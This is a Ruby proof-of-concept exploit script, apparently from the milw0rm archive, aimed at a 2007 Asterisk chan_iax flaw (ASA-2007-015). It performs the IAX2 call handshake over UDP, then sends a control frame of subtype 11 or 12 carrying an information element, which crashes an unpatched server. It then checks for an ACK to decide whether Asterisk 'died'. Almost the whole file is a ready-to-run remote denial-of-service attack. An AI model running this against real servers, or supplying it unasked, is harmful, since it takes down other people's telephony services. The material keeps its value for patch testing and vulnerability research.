#!/usr/bin/env ruby
# author = tenkei_ev
# Script to test chan_iax for the vuln in ASA-2007-015
# Trigger subtypes of 11 or 12 will crash an unpatched server
#
# First establish a call - send new, recv accept, send ack, recv answer, send ack
# Then send IAX2 control packets with subtypes 0x0b or 0x0c that contain an information element
# If asterisk sends an ACK to the trigger, it didn't crash
# If no ACK is read off the socket during the timeout, consider asterisk to be crashed
#
# If any of the expected responses aren't received, asterisk may not crash when sending the trigger
#
# Updated: fix bug in crash detection with patched servers

require 'socket'
require 'timeout'

hostname = nil
trigger_subtype = nil

if(ARGV.length < 2 )
    $stderr.puts "#{$0} <hostname> <Trigger subtype>\r\n"
    exit -1
else
    hostname = ARGV[0]
    if(ARGV[1][0,2] == '0x' || ARGV[1][0,2] == '0X')
        trigger_subtype = ARGV[1].hex
    else
        trigger_subtype  = ARGV[1].to_i
    end
end

t = UDPSocket.new
t.connect(hostname,4569)

puts "[*] Sending NEW #{hostname}"
iax2_new =
        [
            # HEADER
            1 << 15 | 1,    # full-frame bit and source call number
            0,              # retransmit bit and destination call number
            0,              # timestamp
            0,              # outbound stream sequence number
            0,              # inbound stream sequence number - need to reset to 0
            0x06,           # Frame type - IAX2 Control frame
            1,              # IAX2 NEW, C bit unset

            # VERSION IE
            0x0b,
            0x02,
            0x02,

            # FORMAT IE
            # trying to match asterisk - ymmv if your asterisk server rejects you,
            # change this to match some codecs asterisk expects
            0x09,
            0x04,
            0xe703,
        ].pack("nnNCCCC CCn CCN")

t.write(iax2_new)

iax2_accept,sender  = t.recvfrom(1024)
resp        = iax2_accept.unpack("nnNCCCCCCN")
srccall     = resp[0] & 0x7fff
dstcall     = resp[1] & 0x7fff
timestamp   = resp[2]
oseq        = resp[3]
iseq        = resp[4]
frametype   = resp[5]
subtype     = resp[6]

if(frametype == 6 && subtype == 7)
    puts "[*] ACCEPT received from #{hostname}"
else
    puts "[!] Unexpected frame type `#{frametype}`, frame subtype `#{subtype}`"
end

puts "[*] Sending ACK"
iax2_ack =
            [
                1 << 15 | dstcall & 0x7fff,
                0 << 15 | srccall & 0x7fff,
                timestamp.to_i + 1000,
                iseq,
                oseq,
                0x06,                   # IAX2 Control frame
                0 << 7 | 0x04 & 0x7f,   # IAX2 ACK
            ].pack("nnNCCCC")

t.write(iax2_ack)

iax2_answer,sender = t.recvfrom(1024)
resp = iax2_answer.unpack("nnNCCCCCCN")
srccall = resp[0] & 0x7fff
dstcall = resp[1] & 0x7fff
timestamp   = resp[2]
oseq        = resp[3]
iseq        = resp[4]
frametype   = resp[5]
subtype     = resp[6]

if(frametype == 4 && subtype == 4)
    puts "[*] ANSWER received from #{hostname}"
else
    puts "[!] Unexpected frame type `#{frametype}`, frame subtype `#{subtype}`"
end

puts "[*] Sending ACK"
iax2_ack =
            [
                1 << 15 | dstcall & 0x7fff,
                0 << 15 | srccall & 0x7fff,
                timestamp.to_i + 1000,
                iseq,
                oseq,
                0x06,                   # IAX2 Control frame
                0 << 7 | 0x04 & 0x7f,   # IAX2 ACK, C bit unset
            ].pack("nnNCCCC")

t.write(iax2_ack)

puts "[*] Sending trigger"
trigger =
        [
            1 << 15 | dstcall & 0x7fff,
            0 << 15 | srccall & 0x7fff,
            timestamp.to_i + 1000,
            iseq,
            oseq,
            0x06,
            trigger_subtype,

            # IE
            0x0b,
            0x02,
            0x02,

        ].pack("nnNCCCC CCn ")

t.write(trigger)

begin

    timeout_seconds = 2

    Timeout::timeout(timeout_seconds) do |tlength|
        while(trigger_ack = t.recvfrom(1024))
            resp = trigger_ack[0].unpack("nnNCCCCCCN")
            srccall = resp[0] & 0x7fff
            dstcall = resp[1] & 0x7fff
            timestamp   = resp[2]
            oseq        = resp[3]
            iseq        = resp[4]
            frametype   = resp[5]
            subtype     = resp[6]
            if((frametype == 6 && subtype == 4) || (frametype == 6 && subtype == 12))
                puts "[!] Asterisk survived"
                exit
            end
        end
    end

rescue Timeout::Error => e
    puts "[!!!] Asterisk died"
rescue ::Exception => e
end

t.close

# milw0rm.com [2007-07-31]